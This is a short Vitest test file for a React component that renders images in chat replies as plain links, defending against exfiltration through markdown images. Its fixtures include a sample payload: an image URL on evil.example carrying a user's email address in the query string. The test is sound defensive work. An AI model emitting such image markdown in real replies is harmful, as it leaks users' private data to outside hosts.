import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import Markdown from "react-markdown";
import { describe, expect, it } from "vitest";
import { LinkedImage } from "../web/markdownImage";

const render = (md: string) => renderToStaticMarkup(createElement(Markdown, { components: { img: LinkedImage } }, md));

describe("images in a chat reply", () => {
  it("are written as links, so the browser never requests the address", () => {
    const html = render("Bak: ![logo](https://evil.example/p.png?d=ayse@example.com)");
    expect(html).not.toContain("<img");
    expect(html).toContain('<a href="https://evil.example/p.png?d=ayse@example.com" target="_blank" rel="noreferrer">logo</a>');
    expect(render("![](https://evil.example/x.png)")).toContain(">https://evil.example/x.png</a>");
  });
});
